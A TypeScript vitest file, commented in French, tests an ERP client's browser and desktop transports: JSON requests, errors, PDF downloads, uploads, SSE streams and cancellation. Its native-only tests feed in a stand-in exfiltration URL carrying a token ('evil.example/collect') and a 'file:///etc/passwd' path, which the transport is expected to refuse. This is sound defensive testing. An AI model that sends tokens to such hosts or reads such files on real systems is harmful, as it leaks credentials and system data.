/**
 * Le CONTRAT de transport (`lib/transport.ts`), joué à l'identique contre ses deux implémentations : `FetchTransport` (navigateur) et
 * `NativeTransport` (bureau, `desktop/transport.ts`). Un écran ne sait pas lequel le sert : ce que l'un rend, l'autre doit le rendre.
 * Le faux réseau est le même pour les deux (des `Response` standard) ; seul change ce qui est PROPRE au natif, testé à part plus bas.
 */
import { describe, expect, it } from 'vitest'
import { NativeTransport, TransportRefusal, type NativeFetch, type NativeInit } from '@/desktop/transport'
import { FetchTransport, NetworkError, type Transport } from '@/lib/transport'

const ORIGIN = 'https://erp.exemple.fr'
const url = (path: string) => `${ORIGIN}${path}`

interface Sent {
  url: string
  init: NativeInit
}
type Net = (sent: Sent) => Promise<Response> | Response

/** Les deux transports au-dessus du même faux réseau ; `sent` garde ce qui est réellement parti. */
const TRANSPORTS: [string, (net: Net) => { transport: Transport; sent: Sent[] }][] = [
  [
    'FetchTransport (navigateur)',
    (net) => {
      const sent: Sent[] = []
      const transport = new FetchTransport((async (input: RequestInfo | URL, init?: RequestInit) => {
        const one = { url: String(input), init: init as unknown as NativeInit }
        sent.push(one)
        return net(one)
      }) as typeof fetch)
      return { transport, sent }
    },
  ],
  [
    'NativeTransport (bureau)',
    (net) => {
      const sent: Sent[] = []
      const native: NativeFetch = async (u, init) => {
        const one = { url: u, init }
        sent.push(one)
        return net(one) as unknown as ReturnType<NativeFetch>
      }
      return { transport: new NativeTransport(native, [ORIGIN]), sent }
    },
  ],
]

/** Un corps servi morceau par morceau, comme un flux SSE. */
function chunked(parts: (string | Uint8Array)[], init: ResponseInit = { status: 200 }): Response {
  const enc = new TextEncoder()
  const body = new ReadableStream<Uint8Array>({
    start(controller) {
      for (const p of parts) controller.enqueue(typeof p === 'string' ? enc.encode(p) : p)
      controller.close()
    },
  })
  return new Response(body, init)
}

describe.each(TRANSPORTS)('contrat de transport — %s', (_name, make) => {
  it('JSON : méthode, en-têtes et corps partent tels quels ; la réponse est décodée', async () => {
    const { transport, sent } = make(() => new Response(JSON.stringify({ name: 'FA-1' }), { status: 201 }))
    const res = await transport.request({ method: 'POST', url: url('/app/xcore-doctype/doc/Facture'), headers: { Authorization: 'Bearer t', 'X-Tenant-ID': 'acme', 'Content-Type': 'application/json' }, body: { client: 'C1' } })
    expect(res).toEqual({ status: 201, json: { name: 'FA-1' } })
    expect(sent[0]!.url).toBe(url('/app/xcore-doctype/doc/Facture'))
    expect(sent[0]!.init.method).toBe('POST')
    expect(sent[0]!.init.headers).toEqual({ Authorization: 'Bearer t', 'X-Tenant-ID': 'acme', 'Content-Type': 'application/json' })
    expect(sent[0]!.init.body).toBe('{"client":"C1"}')
  })

  it('une réponse d’erreur n’est PAS une exception : statut et corps JSON reviennent (le serveur nomme la cause)', async () => {
    const { transport } = make(() => new Response(JSON.stringify({ detail: { code: 'document_locked' } }), { status: 409 }))
    expect(await transport.request({ method: 'DELETE', url: url('/x'), headers: {} })).toEqual({ status: 409, json: { detail: { code: 'document_locked' } } })
  })

  it('un corps vide ou qui n’est pas du JSON donne `json: null`, jamais une exception', async () => {
    const empty = make(() => new Response(null, { status: 204 }))
    expect(await empty.transport.request({ method: 'DELETE', url: url('/x'), headers: {} })).toEqual({ status: 204, json: null })
    const html = make(() => new Response('<html>502 Bad Gateway</html>', { status: 502 }))
    expect(await html.transport.request({ method: 'GET', url: url('/x'), headers: {} })).toEqual({ status: 502, json: null })
  })

  it('sans corps demandé, rien n’est envoyé comme corps', async () => {
    const { transport, sent } = make(() => new Response('{}'))
    await transport.request({ method: 'GET', url: url('/x'), headers: {} })
    expect(sent[0]!.init.body).toBeUndefined()
  })

  it('serveur injoignable : une `NetworkError`, distincte d’une réponse d’erreur', async () => {
    const { transport } = make(() => {
      throw new TypeError('Failed to fetch')
    })
    const failure = await transport.request({ method: 'GET', url: url('/x'), headers: {} }).catch((e: unknown) => e)
    expect(failure).toBeInstanceOf(NetworkError)
    expect((failure as NetworkError).message).toBe('Le serveur est injoignable')
  })

  it('annulation : un `AbortError`, jamais une `NetworkError` (une recherche remplacée n’est pas une panne)', async () => {
    const { transport } = make(({ init }) => new Promise((_, reject) => init.signal!.addEventListener('abort', () => reject(new DOMException('aborted', 'AbortError')))))
    const controller = new AbortController()
    const pending = transport.request({ method: 'GET', url: url('/search'), headers: {}, signal: controller.signal }).catch((e: unknown) => e)
    controller.abort()
    const failure = (await pending) as Error
    expect(failure).toBeInstanceOf(DOMException)
    expect(failure.name).toBe('AbortError')
    expect(failure).not.toBeInstanceOf(NetworkError)
  })

  it('binaire (PDF) : les octets, le type et le nom proposé d’une réponse RÉUSSIE', async () => {
    const pdf = new Uint8Array([0x25, 0x50, 0x44, 0x46, 0x00, 0xff])
    const { transport } = make(() => new Response(pdf, { status: 200, headers: { 'Content-Type': 'application/pdf', 'Content-Disposition': 'attachment; filename="FA-1.pdf"' } }))
    const res = await transport.request({ method: 'GET', url: url('/print/Facture/FA-1.pdf'), headers: {}, binary: true })
    expect(res.status).toBe(200)
    expect(res.json).toBeNull()
    expect(Array.from(res.bytes!)).toEqual(Array.from(pdf))
    expect(res.contentType).toBe('application/pdf')
    expect(res.disposition).toBe('attachment; filename="FA-1.pdf"')
  })

  it('binaire : un ÉCHEC revient en JSON, sans octets (le serveur répond une erreur ordinaire)', async () => {
    const { transport } = make(() => new Response(JSON.stringify({ detail: { code: 'not_found' } }), { status: 404, headers: { 'Content-Type': 'application/json' } }))
    const res = await transport.request({ method: 'GET', url: url('/print/x.pdf'), headers: {}, binary: true })
    expect(res).toEqual({ status: 404, json: { detail: { code: 'not_found' } } })
    expect(res.bytes).toBeUndefined()
  })

  it('multipart (téléversement) : le formulaire part TEL QUEL, jamais sérialisé en JSON — l’hôte pose l’en-tête et sa frontière', async () => {
    const { transport, sent } = make(() => new Response(JSON.stringify({ file_id: 'f1' }), { status: 201 }))
    const form = new FormData()
    form.append('file', new Blob(['contenu'], { type: 'text/plain' }), 'note.txt')
    const res = await transport.request({ method: 'POST', url: url('/files'), headers: { Authorization: 'Bearer t' }, body: form })
    expect(res).toEqual({ status: 201, json: { file_id: 'f1' } })
    expect(sent[0]!.init.body).toBe(form)
    expect(Object.keys(sent[0]!.init.headers).map((h) => h.toLowerCase())).not.toContain('content-type')
  })

  it('flux (SSE) : chaque morceau arrive décodé dans l’ordre, un caractère coupé entre deux morceaux est recollé, puis le statut', async () => {
    const euro = new TextEncoder().encode('€') // trois octets : coupé après le premier
    const { transport, sent } = make(() => chunked(['event: doc.changed\n', 'data: {"n":1}\n\n', euro.slice(0, 1), euro.slice(1)]))
    const got: string[] = []
    const out = await transport.stream!({ method: 'GET', url: url('/app/xpulse/stream'), headers: { Authorization: 'Bearer t', Accept: 'text/event-stream' } }, (text) => got.push(text))
    expect(out).toEqual({ status: 200 })
    expect(got.join('')).toBe('event: doc.changed\ndata: {"n":1}\n\n€')
    expect(got[0]).toBe('event: doc.changed\n')
    expect(sent[0]!.init.headers).toEqual({ Authorization: 'Bearer t', Accept: 'text/event-stream' })
  })

  it('flux : un refus (401, 404) rend son statut sans rien lire', async () => {
    const { transport } = make(() => new Response('{"detail":"unauthorized"}', { status: 401 }))
    const got: string[] = []
    expect(await transport.stream!({ method: 'GET', url: url('/stream'), headers: {} }, (text) => got.push(text))).toEqual({ status: 401 })
    expect(got).toEqual([])
  })

  it('flux : serveur injoignable → `NetworkError`', async () => {
    const { transport } = make(() => {
      throw new TypeError('Failed to fetch')
    })
    await expect(transport.stream!({ method: 'GET', url: url('/stream'), headers: {} }, () => {})).rejects.toBeInstanceOf(NetworkError)
  })
})

describe('ce qui est PROPRE au transport natif', () => {
  const never: NativeFetch = async () => {
    throw new Error('rien ne doit partir')
  }

  it('refuse, AVANT tout appel, une adresse hors du serveur configuré — et dit laquelle', async () => {
    let calls = 0
    const transport = new NativeTransport(async () => {
      calls += 1
      return new Response('{}') as never
    }, [ORIGIN])
    const failure = await transport.request({ method: 'GET', url: 'https://evil.example/collect?t=jeton', headers: { Authorization: 'Bearer t' } }).catch((e: unknown) => e)
    expect(failure).toBeInstanceOf(TransportRefusal)
    expect(failure).toBeInstanceOf(NetworkError) // chaque écran sait déjà dire une `NetworkError`
    expect((failure as Error).message).toContain('https://evil.example')
    expect(calls).toBe(0)
    // Même hôte, autre port ou autre schéma : une autre origine.
    await expect(transport.request({ method: 'GET', url: 'http://erp.exemple.fr/x', headers: {} })).rejects.toBeInstanceOf(TransportRefusal)
    await expect(transport.stream({ method: 'GET', url: 'https://erp.exemple.fr:8443/stream', headers: {} }, () => {})).rejects.toBeInstanceOf(TransportRefusal)
  })

  it('refuse une adresse relative ou qui n’est pas du réseau : la page de l’application n’a pas d’origine http', async () => {
    const transport = new NativeTransport(never, [ORIGIN])
    for (const bad of ['/app/xcore-doctype/meta', 'config.json', 'file:///etc/passwd', 'tauri://localhost/index.html']) {
      const failure = await transport.request({ method: 'GET', url: bad, headers: {} }).catch((e: unknown) => e)
      expect(failure, bad).toBeInstanceOf(TransportRefusal)
    }
  })

  it('traduit l’annulation du plugin (`Error("Request cancelled")`) en `AbortError`', async () => {
    const controller = new AbortController()
    const transport = new NativeTransport(
      ({}, init) => new Promise((_, reject) => init.signal!.addEventListener('abort', () => reject(new Error('Request cancelled')))),
      [ORIGIN],
    )
    const pending = transport.request({ method: 'GET', url: url('/search'), headers: {}, signal: controller.signal }).catch((e: unknown) => e)
    controller.abort()
    const failure = (await pending) as Error
    expect(failure.name).toBe('AbortError')
    expect(failure).not.toBeInstanceOf(NetworkError)
  })

  it('un signal déjà levé n’envoie rien', async () => {
    const controller = new AbortController()
    controller.abort()
    const failure = (await new NativeTransport(never, [ORIGIN]).request({ method: 'GET', url: url('/x'), headers: {}, signal: controller.signal }).catch((e: unknown) => e)) as Error
    expect(failure.name).toBe('AbortError')
  })

  it('un flux annulé pendant la lecture rejette sur `AbortError` (le plugin fait échouer la lecture avec une chaîne)', async () => {
    const controller = new AbortController()
    const body = new ReadableStream<Uint8Array>({
      start(c) {
        c.enqueue(new TextEncoder().encode('data: 1\n\n'))
        controller.signal.addEventListener('abort', () => c.error('Request cancelled'))
      },
    })
    const transport = new NativeTransport(async () => new Response(body) as never, [ORIGIN])
    const got: string[] = []
    const pending = transport.stream({ method: 'GET', url: url('/stream'), headers: {}, signal: controller.signal }, (t) => got.push(t)).catch((e: unknown) => e)
    await new Promise((r) => setTimeout(r, 0))
    controller.abort()
    expect(((await pending) as Error).name).toBe('AbortError')
    expect(got).toEqual(['data: 1\n\n'])
  })

  it('un corps coupé en route est une panne de réseau NOMMÉE, pas une exception anonyme', async () => {
    const broken = new ReadableStream<Uint8Array>({
      start(c) {
        c.error(new Error('connection reset'))
      },
    })
    const transport = new NativeTransport(async () => new Response(broken) as never, [ORIGIN])
    const failure = (await transport.request({ method: 'GET', url: url('/x'), headers: {} }).catch((e: unknown) => e)) as Error
    expect(failure).toBeInstanceOf(NetworkError)
    expect(failure.message).toBe('La réponse du serveur a été interrompue')
    const again = new NativeTransport(async () => new Response(new ReadableStream<Uint8Array>({ start: (c) => c.error(new Error('reset')) })) as never, [ORIGIN])
    await expect(again.stream({ method: 'GET', url: url('/s'), headers: {} }, () => {})).rejects.toMatchObject({ message: 'Le flux du serveur a été interrompu' })
  })
})
